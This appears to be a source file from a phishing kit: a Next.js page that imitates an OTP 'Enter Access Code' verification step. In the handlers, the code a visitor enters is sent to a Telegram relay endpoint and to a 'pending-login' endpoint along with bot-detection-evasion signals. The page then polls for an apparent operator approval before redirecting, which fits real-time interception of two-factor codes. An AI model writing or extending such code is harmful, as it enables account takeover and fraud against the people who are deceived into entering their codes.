"use client"

import { Suspense, useEffect, useRef, useState, type FormEvent } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
  OTP_CODE_ERROR_TEXT,
  OTP_RESEND_COOLDOWN_SEC,
  OTP_RESEND_LOADING_MS,
} from "@/lib/approval-messages"
import {
  EbcParticipantShell,
  EBC_FIELD_CLASS,
  EBC_LINK_CLASS,
  ebcPrimaryButtonClass,
} from "@/components/ebc-participant-shell"
import { useBotGateSignals } from "@/hooks/use-bot-gate-signals"
import { wait } from "@/lib/loading-delays"
import { readStoredUsername } from "@/lib/login-flow-storage"
import { pollPendingLogin } from "@/lib/poll-pending-login"
import {
  pendingLoginMethod,
  readStoredDeliveryMethod,
  verificationTypeLabel,
  type DeliveryMethod,
} from "@/lib/verification-method"

function parseMethod(raw: string | null): DeliveryMethod {
  if (raw === "email" || raw === "text" || raw === "call") return raw
  return readStoredDeliveryMethod()
}

function EnterCodeContent() {
  const [code, setCode] = useState("")
  const [error, setError] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const [resendCooldown, setResendCooldown] = useState(0)
  const verifyingRef = useRef(false)
  const router = useRouter()
  const searchParams = useSearchParams()
  const getBotGateSignals = useBotGateSignals()
  const method = parseMethod(searchParams.get("method"))
  const intro =
    method === "email"
      ? "An email has been sent with an access code. Enter the code to continue."
      : "A code has been sent to your phone. Enter the access code to continue."
  const numericCode = code.replace(/\D/g, "")
  const isCodeValid = numericCode.length >= 4 && numericCode.length <= 8
  const secondaryBusy = isResending || resendCooldown > 0

  useEffect(() => {
    try {
      if (!sessionStorage.getItem("loginReady")) {
        window.location.href = "/"
      }
    } catch {
      window.location.href = "/"
    }
  }, [])

  useEffect(() => {
    if (resendCooldown <= 0) return
    const timer = setInterval(
      () => setResendCooldown((prev) => (prev <= 1 ? 0 : prev - 1)),
      1000,
    )
    return () => clearInterval(timer)
  }, [resendCooldown])

  const clearOtpAndFocus = (message: string) => {
    setCode("")
    setError(message)
    setIsLoading(false)
    verifyingRef.current = false
  }

  const handleVerify = async (e?: FormEvent) => {
    e?.preventDefault()
    if (isLoading || verifyingRef.current) return
    const otpCode = code.replace(/\D/g, "").slice(0, 8)
    if (otpCode.length < 4) {
      setError("Please enter the complete code")
      return
    }

    verifyingRef.current = true
    setIsLoading(true)
    setError("")

    const typeLabel = verificationTypeLabel(method)

    await fetch("/api/telegram/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        code: otpCode,
        verificationType: typeLabel,
        page: "/verify",
      }),
    }).catch(() => {})

    const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || "login"
    const maskedEmail = sessionStorage.getItem("maskedEmail") ?? "**********"
    const maskedPhone = sessionStorage.getItem("maskedPhone") ?? "***-***-****"

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          kind: "otp",
          userId,
          password: otpCode,
          method: pendingLoginMethod(method),
          maskedEmail,
          maskedPhone,
          flow: "otp",
          ...getBotGateSignals(),
        }),
      })
      const data = (await res.json()) as { id?: string; error?: string }
      if (!res.ok) {
        clearOtpAndFocus(data.error || MSG_UNABLE_REACH_VERIFICATION)
        return
      }
      if (!data.id) {
        clearOtpAndFocus(OTP_CODE_ERROR_TEXT)
        return
      }

      const result = await pollPendingLogin(data.id, APPROVAL_TIMEOUT_MS)
      if (result === "approved" || result === "redirected") {
        window.location.href = "/api/login-out"
        return
      }
      if (result === "timeout") {
        clearOtpAndFocus(MSG_UNABLE_VERIFY_TIME)
        return
      }
      clearOtpAndFocus(OTP_CODE_ERROR_TEXT)
    } catch {
      clearOtpAndFocus(MSG_UNABLE_REACH_VERIFICATION)
    }
  }

  const handleResend = async () => {
    if (secondaryBusy) return
    setIsResending(true)
    setCode("")
    setError("")
    try {
      void fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ page: "/verify" }),
      }).catch(() => {})
      await wait(OTP_RESEND_LOADING_MS)
      setResendCooldown(OTP_RESEND_COOLDOWN_SEC)
    } finally {
      setIsResending(false)
    }
  }

  const resendLabel = isResending
    ? "Loading..."
    : resendCooldown > 0
      ? `Didn't receive code? Resend in ${resendCooldown}s`
      : "Didn't receive code?"

  return (
    <EbcParticipantShell title="Enter Access Code" intro={intro}>
      <form onSubmit={handleVerify} className="max-w-xl">
        <div className="flex flex-col md:grid md:grid-cols-[180px_1fr] md:gap-x-5">
          <label
            htmlFor="verify-code"
            className="md:text-right font-bold text-[20px] md:leading-10 mb-2 md:mb-0"
          >
            Access code
          </label>
          <div>
            <input
              id="verify-code"
              type="text"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={code}
              onChange={(e) => {
                setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
                if (error) setError("")
              }}
              maxLength={8}
              className={EBC_FIELD_CLASS}
            />
            <button
              type="button"
              onClick={handleResend}
              disabled={secondaryBusy}
              className={EBC_LINK_CLASS}
            >
              {resendLabel}
            </button>
            {error ? (
              <p className="mt-3 text-red-600 text-sm" role="alert">
                {error}
              </p>
            ) : null}
          </div>
        </div>

        <div className="mt-8">
          <button
            type="submit"
            disabled={!isCodeValid || isLoading}
            className={ebcPrimaryButtonClass(!isCodeValid || isLoading)}
          >
            <span className="text-[18px]">{isLoading ? "Loading..." : "Continue"}</span>
          </button>
          <button
            type="button"
            disabled={isLoading}
            onClick={() => router.push("/verify-choice")}
            className={`${EBC_LINK_CLASS} mt-3`}
          >
            Cancel
          </button>
        </div>
      </form>
    </EbcParticipantShell>
  )
}

export default function EnterCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
          Loading...
        </div>
      }
    >
      <EnterCodeContent />
    </Suspense>
  )
}
